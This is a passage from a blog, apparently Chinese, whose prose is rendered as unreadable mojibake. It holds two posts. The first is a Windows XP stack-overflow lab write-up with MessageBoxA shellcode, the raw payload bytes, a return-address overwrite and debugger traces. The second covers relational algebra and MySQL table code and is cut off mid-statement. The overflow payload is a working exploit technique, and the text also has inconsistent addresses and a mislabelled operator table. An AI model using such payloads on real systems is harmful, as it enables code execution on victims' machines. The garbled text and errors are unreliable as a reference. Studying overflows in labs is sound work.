<p>é‚£ä¹ˆå¾€bufferå†™44+4+4&#x3D;52ä¸ªå­—ç¬¦,è¿™52ä¸ªå­—ç¬¦é‡Œå°±åŒ…æ‹¬äº†shellcode,å°±åˆ°è¿”å›åœ°å€çš„å®¶é—¨å£äº†,ç„¶åå°†0x19FF04å³bufferåŸºåœ°å€å†™åˆ°è¿”å›åœ°å€ä¸Š,å¦‚æ­¤å‡½æ•°è¿”å›æ—¶,æ§åˆ¶å°†è½¬ç§»åˆ°0x12FAF0,</p>
<p>ç”±äºstrcpyå‡½æ•°æ‰§è¡Œå,ä¸ä¼šå†æœ‰å…¶ä»–è¡Œä¸ºæ”¹å˜bufferç¼“å†²åŒº,ç„¶åå‡½æ•°è¿”å›ä¹‹å‰é€€æ ˆåªæ˜¯æŠ¬é«˜esp,bufferæˆä¸ºéæ³•åŒºåŸŸ,ä½†æ˜¯å…¶å†…å®¹ä¸ä¼šè¢«æ‰¬äº†,ç„¶åè¿”å›åœ°å€é€€æ ˆäº¤ç»™eip,æŒ‡å‘æ‰§è¡Œshellcodeå¹¶æ‰§è¡Œ</p>
<p>ä¸‹é¢çš„ä»»åŠ¡å°±æ˜¯å¦‚ä½•ç¼–å†™shellcode</p>
<h3 id="ç¼–å†™shellcode"><a href="#ç¼–å†™shellcode" class="headerlink" title="ç¼–å†™shellcode"></a>ç¼–å†™shellcode</h3><p>é¦–å…ˆéœ€è¦æ‰¾åˆ°MessageBoxå‡½æ•°çš„åœ°å€</p>
<p>windowsä¸ºäº†å‡å°‘åŸºå€é‡å®šä½çš„å¼€é”€,ç»™æ¯ä¸ªç³»ç»ŸåŠ¨æ€åº“éƒ½åˆ†é…äº†å„è‡ªçš„åŸºåœ°å€,ä¿è¯ä»–ä»¬ç›¸äº’ä¸å†²çª.</p>
<p>ä½†æ˜¯åœ¨ä¸åŒçš„æ“ä½œç³»ç»Ÿä¸Š,ç³»ç»Ÿdllçš„åŸºåœ°å€ä¹Ÿæ˜¯ä¸ä¸€æ ·çš„</p>
<p>åœ¨windows xp professionalç³»ç»Ÿä¸Š,user32.dllçš„æ˜ åƒåŸºå€æ˜¯77D10000h</p>
<blockquote>
<p>è€Œä¹¦ä¸Šå†™çš„æ˜¯windows xp SP3ç³»ç»Ÿä¸­user32.dllçš„æ˜ åƒåŸºå€æ˜¯77D40000h</p>
<p>ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»ä¸Šå†™çš„æ˜¯7E410000h</p>
</blockquote>
<p>ç„¶åç”¨VC++è‡ªå¸¦çš„DEPENDS.EXEç¨‹åºè§‚å¯Ÿuser32.dllä¸­MessageBoxAå‡½æ•°çš„åç§»é‡</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916231943081.png" alt="Microsoft Visual Studio\Common\Tools\DEPENDS.TXT"></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916230413042.png" alt="åºå·477,æœ€æœ‰å¯èƒ½çš„ä¸‹æ ‡476,å‡½æ•°åMessageBoxA,å…¥å£ç‚¹(ç›¸å¯¹åç§»)0x2ADD7"></p>
<p>VA&#x3D;RVA+ImageBase&#x3D;0x2ADD7+0x77D10000&#x3D;0x77D3ADD7</p>
<p>è¿™å°±æ‰¾åˆ°äº†MessageBoxAå‡½æ•°çš„è™šæ‹Ÿåœ°å€</p>
<p>shellcodeæ˜¯è¿™æ ·å†™çš„:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">xor ebx,ebx</span><br><span class="line">push ebx</span><br><span class="line">push 0x74736577</span><br><span class="line">push 0x6c696166</span><br><span class="line">mov eax,esp</span><br><span class="line">push ebx</span><br><span class="line">push eax</span><br><span class="line">push eax</span><br><span class="line">push ebx</span><br><span class="line">mov eax,0x77D3ADD7;MessageBoxAåœ°å€å‹æ ˆ</span><br><span class="line">call eax</span><br></pre></td></tr></table></figure>

<p>ç¼–è¯‘æˆæœºå™¨ç ä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">33DB536877657374686661696C8BC453505053B8D7ADD377FFD0</span><br></pre></td></tr></table></figure>

<p>è¿™æ˜¯26ä¸ªå­—èŠ‚äº†,ç”¨0x90(å•¥ä¹Ÿä¸å¹²nop)å†å¡«å……26ä¸ªå­—èŠ‚åˆ°è¿”å›åœ°å€çš„å®¶é—¨å£,</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br></pre></td></tr></table></figure>

<p>ç„¶åå››ä¸ªå­—èŠ‚ç”¨bufferçš„åŸºåœ°å€0x0019FF04,æº¢å‡ºè¿”å›åœ°å€,åªå†™ä½3å­—èŠ‚å°±å¯ä»¥,é«˜ä¸€ä¸ªå­—èŠ‚â€™\0â€™è‡ªåŠ¨å¡«ä¸Šäº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F0 FA 12</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">33 DB 53 68 77 65 73 74 68 66 61 69 6C 8B C4 53</span><br><span class="line">50 50 53 B8 D7 AD D3 77 FF D0 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 90 F0 FA 12</span><br></pre></td></tr></table></figure>

<p>ç”¨010editorå†™åˆ°password.txtä¸­ç„¶åä¿å­˜</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917003356045.png" alt="image-20220917003356045"></p>
<p>åœ¨windows XPè™šæ‹Ÿæœºä¸Šæ‰§è¡ŒæˆåŠŸ</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917003507819.png" alt="image-20220917003507819"></p>
<p>åœ¨windows 11ä¸Šç™½æ­,ä¸€æ˜¯æ²¡æ‰¾åˆ°32ä½çš„user32.dll,äºŒæ˜¯ebpå€¼å’Œwindows XPä¸Šä¸åŒ</p>
<h3 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h3><p>åœ¨windows XPä¸Šè°ƒè¯•æœ¬ç¨‹åº</p>
<p>åœ¨strcpyæ‰§è¡Œä¹‹åä»0x12FAF0å¼€å§‹çš„44+4+4+4ä¸ªå­—èŠ‚éƒ½è¢«æº¢å‡ºä¿®æ”¹</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917004128116.png" alt="image-20220917004128116"></p>
<p>retnè¿”å›ä¹‹å,æ§åˆ¶å·²ç»åˆ°è¾¾äº†0x0012FAF0å¤„,å¼€å§‹æ‰§è¡Œshellcode</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917004302943.png" alt="image-20220917004302943"></p>
<p>æ­¤æ—¶å †æ ˆé¡¶ESPæŒ‡å‘0x12FB28,è¿™æ˜¯mainå‡½æ•°call verify_passwordä¹‹å‰çš„æ ˆé¡¶ä½ç½®,</p>
<p>å †æ ˆä»å¤§åˆ°å°ç”Ÿé•¿çš„è¯,0x0012FAF0æ˜¯åœ¨å…¶ç”Ÿé•¿é“è·¯ä¸Šçš„,shellcodeæœ‰æ²¡æœ‰è¢«å†æ¬¡ç”Ÿé•¿çš„å †æ ˆè¦†ç›–çš„å¯èƒ½å‘¢?</p>
<p>shellcodeä¸­æœ‰7ä¸ªå‹æ ˆ,ä¹Ÿå°±æ˜¯28&#x3D;0x1Aä¸ªå­—èŠ‚,0x12FB28-0x1A&#x3D;0x12FB0E&gt;0x12FAF0,ä¸ä¼šè¦†ç›–shellcode,å¯ä»¥æ”¾å¿ƒæ‰§è¡Œ</p>
<p>å½“MessageBoxAå‡½æ•°è¿”å›æ—¶,ä¸‹é¢å°±æ²¡æœ‰æœ‰æ„ä¹‰çš„æŒ‡ä»¤äº†,è¿Ÿæ—©è¦å¯„æ‰</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917005330244.png" alt="image-20220917005330244"></p>
<p>åœ¨0x12fb0aå¤„å°±å¯„äº†,é”™è¯¯ä»£ç 0xc0000005</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/09/16/%E5%85%B3%E7%B3%BB%E4%BB%A3%E6%95%B0%E5%92%8CSQL%E8%AF%AD%E8%A8%80/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/16/%E5%85%B3%E7%B3%BB%E4%BB%A3%E6%95%B0%E5%92%8CSQL%E8%AF%AD%E8%A8%80/" class="post-title-link" itemprop="url">å…³ç³»ä»£æ•°å’ŒSQLè¯­è¨€</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-09-16 00:59:00" itemprop="dateCreated datePublished" datetime="2022-09-16T00:59:00+08:00">2022-09-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-11-14 09:42:56" itemprop="dateModified" datetime="2022-11-14T09:42:56+08:00">2022-11-14</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="å…³ç³»ä»£æ•°ä¸SQLè¯­å¥"><a href="#å…³ç³»ä»£æ•°ä¸SQLè¯­å¥" class="headerlink" title="å…³ç³»ä»£æ•°ä¸SQLè¯­å¥"></a>å…³ç³»ä»£æ•°ä¸SQLè¯­å¥</h1><h2 id="å…³ç³»æ¨¡å‹æœ¯è¯­"><a href="#å…³ç³»æ¨¡å‹æœ¯è¯­" class="headerlink" title="å…³ç³»æ¨¡å‹æœ¯è¯­"></a>å…³ç³»æ¨¡å‹æœ¯è¯­</h2><table>
<thead>
<tr>
<th>å…³ç³»æ¨¡å‹æœ¯è¯­</th>
<th>å¯¹åº”åˆ°è¡¨</th>
</tr>
</thead>
<tbody><tr>
<td>å…³ç³»</td>
<td>è¡¨</td>
</tr>
<tr>
<td>å…ƒç»„</td>
<td>è¡Œ</td>
</tr>
<tr>
<td>å±æ€§</td>
<td>åˆ—</td>
</tr>
<tr>
<td>å…³ç³»å®ä¾‹</td>
<td>è¡¨ä¸­çš„ç‰¹å®šè¡Œ</td>
</tr>
<tr>
<td>å±æ€§çš„åŸŸ</td>
<td>è¯¥å±æ€§åˆ—ä¸­æ‰€æœ‰å¯èƒ½çš„å–å€¼</td>
</tr>
</tbody></table>
<p>å…³ç³»æ¨¡å¼:å®šä¹‰ç±»å‹</p>
<p>å…³ç³»:å…³ç³»æ¨¡å¼çš„å®ä¾‹</p>
<p><code>Employer(ID,salary,gender,age);</code>è¿™å°±æ˜¯å…³ç³»æ¨¡å¼</p>
<p><code>Tom(00001,5k,male,20);</code>è¿™å°±æ˜¯å…³ç³»</p>
<p>ç›¸å½“äº</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Employer</span>&#123;</span><span class="comment">//Employerå…³ç³»æ¨¡å¼</span></span><br><span class="line">	<span class="type">int</span> ID;</span><br><span class="line">    <span class="type">int</span> salary;</span><br><span class="line">    <span class="type">bool</span> gender;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    Employer(<span class="type">const</span> <span class="type">int</span> &amp;i,<span class="type">const</span> <span class="type">int</span> &amp;s,<span class="type">const</span> <span class="type">bool</span> &amp;g,<span class="type">const</span> <span class="type">int</span> &amp;a)&#123;</span><br><span class="line">    	ID=i;</span><br><span class="line">    	salary=s;</span><br><span class="line">    	gender=g;</span><br><span class="line">    	age=a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">Employer <span class="title function_">Tom</span><span class="params">(<span class="number">1</span>,<span class="number">5000</span>,<span class="number">1</span>,<span class="number">20</span>)</span>;<span class="comment">//å…³ç³»,å…³ç³»å®ä¾‹</span></span><br></pre></td></tr></table></figure>



<p>ç :åŒºåˆ†ä¸åŒå…³ç³»çš„æ ‡å¿—</p>
<blockquote>
<p>æ¯”å¦‚äººçš„èº«ä»½è¯ID</p>
</blockquote>
<p>è¶…ç :å…³ç³»æ¨¡å¼ä¸­,èƒ½å¤Ÿå”¯ä¸€æ ‡è¯†ä¸€ä¸ªå…³ç³»çš„å±æ€§æˆ–è€…å±æ€§é›†åˆ</p>
<blockquote>
<p>æ¯”å¦‚Student(ID,eduID,class,grade,name)</p>
<p>å­¦ç”Ÿ(èº«ä»½è¯å·,å­¦å·,å¹´çº§,ç­çº§,å§“å)</p>
<p>è¿™é‡ŒIDå’ŒeduIDéƒ½å¯ä»¥ä½œä¸ºè¶…ç ,</p>
<p>å¦‚æœè®¤ä¸ºæ¯ä¸ªç­é‡Œéƒ½æ²¡æœ‰é‡åçš„äºº,åˆ™(å¹´çº§,ç­çº§,å§“å)ä¹Ÿå¯ä»¥ä½œä¸ºè¶…ç </p>
</blockquote>
<blockquote>
<p>æ˜¾ç„¶è¶…ç çš„ä»»ä½•ä¸€ä¸ªè¶…é›†ä¹Ÿæ˜¯è¶…ç </p>
</blockquote>
<p>å€™é€‰ç :æœ€å°è¶…ç </p>
<blockquote>
<p>æ¯”å¦‚Student(ID,eduID,class,grade,name)</p>
<p>ç”±äºIDæ˜¯è¶…ç ,å› æ­¤IDçš„ä»»ä½•ä¸€ä¸ªè¶…é›†,æ¯”å¦‚(ID,grade)ä¹Ÿæ˜¯è¶…ç </p>
<p>IDå¯ä»¥ä½œä¸ºå€™é€‰ç ,å› ä¸ºIDå·²ç»æ˜¯æœ€å°è¶…ç ,ä½†æ˜¯(ID,grade)ä¸æ˜¯å€™é€‰ç ,å› ä¸ºå»äº†grade,åªå‰©ä¸‹IDä»ç„¶æ˜¯è¶…ç </p>
</blockquote>
<p>ä¸»ç (primary key):å®é™…ä¸­,æ•°æ®åº“è®¾è®¡è€…é€‰ä¸­ä½œä¸ºåŒºåˆ†ä¸åŒå…³ç³»çš„å€™é€‰ç </p>
<blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> troop(</span><br><span class="line"> <span class="operator">-</span><span class="operator">&gt;</span> id <span class="type">int</span>,</span><br><span class="line"> <span class="operator">-</span><span class="operator">&gt;</span> name <span class="type">varchar</span>(<span class="number">255</span>),</span><br><span class="line"> <span class="operator">-</span><span class="operator">&gt;</span> age <span class="type">int</span>,</span><br><span class="line"> <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">PRIMARY</span> KEY(id)</span><br><span class="line"> <span class="operator">-</span><span class="operator">&gt;</span> );</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure>

<p>å°†idä½œä¸ºä¸»ç </p>
</blockquote>
<p>å¤–ç :</p>
<p>å…³ç³»æ¨¡å¼r1çš„å±æ€§ä¸­å¯èƒ½åŒ…å«å…¶ä»–å…³ç³»æ¨¡å¼r2çš„ä¸»ç .</p>
<p>åˆ™è¯¥å±æ€§åœ¨r1ä¸Šç§°ä½œâ€å‚ç…§r2çš„å¤–ç â€,</p>
<p>å…³ç³»æ¨¡å¼r1ç§°ä¸ºâ€å¤–ç ä¾èµ–çš„å‚ç…§å…³ç³»â€</p>
<p>å…³ç³»æ¨¡å¼r2ç§°ä¸ºâ€å¤–ç çš„è¢«å‚ç…§å…³ç³»â€</p>
<blockquote>
<p>æ¯”å¦‚</p>
<p>Person&#x3D;Person(ID,eduID,name,age,gender),å…¶ä¸­èº«ä»½è¯å·IDä¸ºä¸»é”®</p>
<p>Student&#x3D;Student(eduID,grade,class,name,age,gender),å…¶ä¸­å­¦å·eduIDä¸ºä¸»é”®</p>
<p>é‚£ä¹ˆeduIDå°±æ˜¯Personçš„â€å‚ç…§Studentçš„å¤–ç â€</p>
<p>Personå°±æ˜¯â€eduIDå¤–ç ä¾èµ–çš„å‚ç…§å…³ç³»â€</p>
<p>Studentå°±æ˜¯â€eduIDå¤–ç çš„è¢«å‚ç…§å…³ç³»â€</p>
</blockquote>
<p>æ¨¡å¼å›¾:</p>
<p>ç”¨æ¨¡å¼å›¾(schema diagram)è¡¨ç¤ºå«æœ‰ä¸»ç å’Œå¤–ç ä¾èµ–çš„æ•°æ®åº“æ¨¡å¼</p>
<p>è¿™ä¸ªç©æ„ç”¨è½¯ä»¶ç”»ä¸ç”¨æ‰‹ç”»</p>
<h2 id="å…³ç³»ä»£æ•°"><a href="#å…³ç³»ä»£æ•°" class="headerlink" title="å…³ç³»ä»£æ•°"></a>å…³ç³»ä»£æ•°</h2><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220914113622895.png" alt="image-20220914113622895"></p>
<table>
<thead>
<tr>
<th>Operation</th>
<th>ä¸­æ–‡</th>
<th>ç¬¦å·</th>
<th>$\LaTeX$</th>
</tr>
</thead>
<tbody><tr>
<td>Projection</td>
<td>æŠ•å½±</td>
<td>Î </td>
<td><code>\Pi</code></td>
</tr>
<tr>
<td>Selection</td>
<td>é€‰æ‹©</td>
<td>Ïƒ</td>
<td><code>\sigma</code></td>
</tr>
<tr>
<td>Renaming</td>
<td>é‡å‘½å</td>
<td>Ï</td>
<td><code>\rho</code></td>
</tr>
<tr>
<td>Aggregate Function</td>
<td>èšåˆå‡½æ•°</td>
<td>G</td>
<td><code>\mathcal&#123;G&#125;</code></td>
</tr>
<tr>
<td>Union</td>
<td>äº¤</td>
<td>âˆ©</td>
<td><code>\cap</code></td>
</tr>
<tr>
<td>Intersection</td>
<td>è¡¥</td>
<td>âˆª</td>
<td><code>\cup</code></td>
</tr>
<tr>
<td>Natural Join</td>
<td>è‡ªç„¶è¿æ¥</td>
<td>â‹ˆ</td>
<td><code>\bowtie</code> or <code>\Join</code></td>
</tr>
<tr>
<td>Left Outer Join</td>
<td>å·¦å¤–è¿æ¥</td>
<td>âŸ•</td>
<td>â€¦ è¿™å‡ ä¸ªç›´æ¥å¤åˆ¶å§</td>
</tr>
<tr>
<td>Right Outer Join</td>
<td>å³å¤–è¿æ¥</td>
<td>âŸ–</td>
<td></td>
</tr>
<tr>
<td>Full Outer Join</td>
<td>å…¨å¤–è¿æ¥</td>
<td>âŸ—</td>
<td></td>
</tr>
<tr>
<td>Cartesian product</td>
<td>ç¬›å¡å°”ä¹˜ç§¯</td>
<td>Ã—</td>
<td><code>\times</code></td>
</tr>
<tr>
<td>Divide</td>
<td>é™¤</td>
<td>Ã·</td>
<td><code>\div</code></td>
</tr>
<tr>
<td>Assignment</td>
<td>èµ‹å€¼</td>
<td>â†</td>
<td><code>\leftarrow</code></td>
</tr>
<tr>
<td>And</td>
<td>æ¡ä»¶å¹¶åˆ—</td>
<td>âˆ§</td>
<td><code>\land</code> or <code>\vee</code></td>
</tr>
<tr>
<td>Negation</td>
<td>é</td>
<td>Â¬</td>
<td><code>\neg</code></td>
</tr>
<tr>
<td>Exist</td>
<td>å­˜åœ¨</td>
<td>âˆƒ</td>
<td><code>\exists</code></td>
</tr>
<tr>
<td>For All</td>
<td>å¯¹æ‰€æœ‰</td>
<td>âˆ€</td>
<td><code>\forall</code></td>
</tr>
<tr>
<td></td>
<td>ä¸‹æ ‡æ–‡å­—</td>
<td>Ïƒusername</td>
<td><code>_&#123;\text&#123;&#125;&#125;</code></td>
</tr>
<tr>
<td></td>
<td>ç²—ä½“æ–‡å­—</td>
<td>Gcount(*)</td>
<td><code>\textbf&#123;&#125;</code></td>
</tr>
<tr>
<td></td>
<td>é•¿é•¿é•¿é•¿æ‹¬å·</td>
<td>((((</td>
<td><code>\big( \Big( \bigg( \Bigg(</code></td>
</tr>
<tr>
<td></td>
<td>æ¯”è¾ƒ</td>
<td>&gt;â‰¥&lt;â‰¤â‰ </td>
<td><code>\gt \ge \lt \le \ne</code></td>
</tr>
</tbody></table>
<h3 id="é€’å½’å®šä¹‰"><a href="#é€’å½’å®šä¹‰" class="headerlink" title="é€’å½’å®šä¹‰"></a>é€’å½’å®šä¹‰</h3><p>å‡è®¾$E_1,E_2$éƒ½æ˜¯å…³ç³»ä»£æ•°è¡¨è¾¾å¼,æ˜¾ç„¶è¯¥è¡¨è¾¾å¼çš„è¿”å›å€¼æ˜¯ä¸€ä¸ªå…³ç³»å­é›†</p>
<p>é‚£ä¹ˆå…³ç³»ä»£æ•°è¡¨è¾¾å¼çš„è¡¨è¾¾å¼ä¹Ÿæ˜¯å…³ç³»ä»£æ•°è¡¨è¾¾å¼</p>
<p>ç›¸å½“äºæ•´æ•°çš„åŠ å‡ä¹˜é™¤ç­‰è¿ç®—çš„ç»“æœè¿˜æ˜¯æ•´æ•°,è¿ç®—çš„ç»“æœè¿˜èƒ½å‚ä¸è¿ç®—</p>
<h3 id="mysqlå»ºè¡¨ä»£ç "><a href="#mysqlå»ºè¡¨ä»£ç " class="headerlink" title="mysqlå»ºè¡¨ä»£ç "></a>mysqlå»ºè¡¨ä»£ç </h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> if <span class="keyword">not</span> <span class="keyword">EXISTS</span> instructor(</span><br><span class="line">    ID <span class="type">int</span>,</span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">255</span>),</span><br><span class="line">    dept_name <span class="type">varchar</span>(<span class="number">255</span>),</span><br><span class="line">    salary <span class="type">int</span>,</span><br><span class="line">    <span class="keyword">primary</span> key(id)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> ignore <span class="keyword">into</span> instructor(ID,name,dept_name,salary) <span class="keyword">values</span> (<span class="number">10101</span>,&quot;Srinivasan&quot;,&quot;Comp.Sci.&quot;,<span class="number">65000</span>);</span><br><span class="line"><span class="keyword">insert</span> ignore <span class="keyword">into</span> instructor(ID,name,dept_name,salary) <span class="keyword">values</span> (<span class="number">12121</span>,&quot;Wu&quot;,&quot;Finance&quot;,<span class="number">90000</span>);</span><br><span class="line"><span class="keyword">insert</span> ignore <span class="keyword">into</span> instructor(ID,name,dept_name,salary) <span class="keyword">values</span> (<span class="number">15151</span>,&quot;Mozart&quot;,&quot;Music&quot;,<span class="number">40000</span>);</span><br><span class="line"><span class="keyword">insert</span> ignore <span class="keyword">into</span> instructor(ID,name,dept_name,salary) <span class="keyword">values</span> (<span class="number">22222</span>,&quot;Einstein&quot;,&quot;Physics&quot;,<span class="number">95000</span>);</span><br><span class="line"><span class="keyword">insert</span> ignore <span class="keyword">into</span> instructor(ID,name,dept_name,salary) <span class="keyword">values</span> (<span class="number">32343</span>,&quot;El Said&quot;,&quot;History&quot;,<span class="number">60000</span>);</span><br><span class="line"><span class="keyword">insert</span> ignore <span class="keyword">into</span> instructor(ID,name,dept_name,salary) <span class="keyword">values</span> (<span class="number">33456</span>,&quot;Gold&quot;,&quot;Physics&quot;,<span class="number">87000</span>);</span><br><span class="line"><span class="keyword">insert</span> ignore <span class="keyword">into</span> instructor(ID,name,dept_name,salary) <span class="keyword">values</span> (<span class="number">45565</span>,&quot;Katz&quot;,&quot;Comp.Sci.&quot;,<span class="number">75000</span>);</span><br><span class="line"><span class="keyword">insert</span> ignore <span class="keyword">into</span> instructor(ID,name,dept_name,salary) <span class="keyword">values</span> (<span class="number">58583</span>,&quot;Caliiferi&quot;,&quot;History&quot;,<span class="number">62000</span>);</span><br><span class="line"><span class="keyword">insert</span> ignore <span class="keyword">into</span> instructor(ID,name,dept_name,salary) <span class="keyword">values</span> (<span class="number">76543</span>,&quot;Singh&quot;,&quot;Finance&quot;,<span class="number">80000</span>);</span><br><span class="line"><span class="keyword">insert</span> ignore <span class="keyword">into</span> instructor(ID,name,dept_name,salary) <span class="keyword">values</span> (<span class="number">76766</span>,&quot;Crick&quot;,&quot;Biology&quot;,<span class="number">72000</span>);</span><br><span class="line"><span class="keyword">insert</span> ignore <span class="keyword">into</span> instructor(ID,name,dept_name,salary) <span class="keyword">values</span> (<span class="number">83821</span>,&quot;Brandt&quot;,&quot;Comp.Sci.&quot;,<span class="number">92000</span>);</span><br><span class="line"><span class="keyword">insert</span> ignore <span class="keyword">into</span> instructor(ID,name,dept_name,salary) <span class="keyword">values</span> (<span class="number">98345</span>,&quot;Kim&quot;,&quot;Elec.Eng.&quot;,<span class="number">80000</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> if <span class="keyword">not</span> <span class="keyword">exists</span> teaches(</span><br><span class="line">  ID <span class="type">int</span>,</span><br><span class="line">  course_id <span class="type">varchar</span>(<span class="number">255</span>),</span><br><span class="line">  sec_id <span class="type">int</span>,</span><br><span class="line">  semester <span class="type">varchar</span>(<span class="number">255</span>),</span><br><span class="line">  <span class="keyword">year</span> <span class="type">int</span>,</span><br><span class="line">  <span class="keyword">primary</span> key(course_id)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">insert</span> ignore <span class="keyword">into</span> teaches(ID,course_id,sec_id,semester,<span class="keyword">year</span>) <span class="keyword">values</span> (<span class="number">10101</span>,&quot;CS-101&quot;,<span class="number">1</span>,&quot;Fall&quot;,<span class="number">2017</span>);</span><br><span class="line"><span class="keyword">insert</span> ignore <span class="keyword">into</span> teaches(ID,course_id,sec_id,semester,<span class="keyword">year</span>) <span class="keyword">values</span> (<span class="number">10101</span>,&quot;CS-315&quot;,<span class="number">1</span>,&quot;Spring&quot;,<span class="number">2018</span>);</span><br><span class="line"><span class="keyword">insert</span> ignore <span class="keyword">into</span> teaches(ID,course_id,sec_id,semester,<span class="keyword">year</span>) <span class="keyword">values</span> (<span class="number">10101</span>,&quot;CS-347&quot;,<span class="number">1</span>,&quot;Fall&quot;,<span class="number">2017</span>);</span><br><span class="line"><span class="keyword">insert</span> ignore <span class="keyword">into</span> teaches(ID,course_id,sec_id,semester,<span class="keyword">year</span>) <span class="keyword">values</span> (<span class="number">12121</span>,&quot;FIN-201&quot;,<span class="number">1</span>,&quot;Spring&quot;,<span class="number">2018</span>);</span><br><span class="line"><span class="keyword">insert</span> ignore <span class="keyword">into</span> teaches(ID,course_id,sec_id,semester,<span class="keyword">year</span>) <span class="keyword">values</span> (<span class="number">15151</span>,&quot;MU-199&quot;,<span class="number">1</span>,&quot;Spring&quot;,<span class="number">2018</span>);</span><br><span class="line"><span class="keyword">insert</span> ignore <span class="keyword">into</span> teaches(ID,course_id,sec_id,semester,<span class="keyword">year</span>) <span class="keyword">values</span> (<span class="number">22222</span>,&quot;PHY-101&quot;,<span class="number">1</span>,&quot;Fall&quot;,<span class="number">2017</span>);</span><br><span class="line"><span class="keyword">insert</span> ignore <span class="keyword">into</span> teaches(ID,course_id,sec_id,semester,<span class="keyword">year</span>) <span class="keyword">values</span> (<span class="number">32343</span>,&quot;HIS-351&quot;,<span 